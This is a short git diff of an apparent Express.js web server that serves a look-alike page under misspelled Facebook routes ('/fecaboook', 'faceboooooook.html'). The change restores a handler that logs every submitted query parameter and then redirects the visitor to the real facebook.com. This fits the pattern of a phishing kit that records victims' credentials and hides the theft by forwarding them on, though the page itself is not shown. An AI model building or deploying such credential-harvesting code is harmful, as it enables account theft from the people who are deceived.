@@ -30,13 +30,13 @@ app.post('/fecaboook', (req, res, next) => {
     res.sendFile(__dirname + '/faceboooooook.html')
     //res.redirect('http://www.facebook.com');
 });
-/*
-app.gett('/fecaboook', (req, res, next) => {
+
+app.get('/fecaboook', (req, res, next) => {
     console.log('redirect to facebook');
     console.log(JSON.stringify(req.query))
     res.redirect('http://www.facebook.com');
 });
-*/
+
 app.get('/faceboooooook', (req, res, next) => {
     console.log('opening client page');
     res.sendFile(__dirname + '/faceboooooook.html')
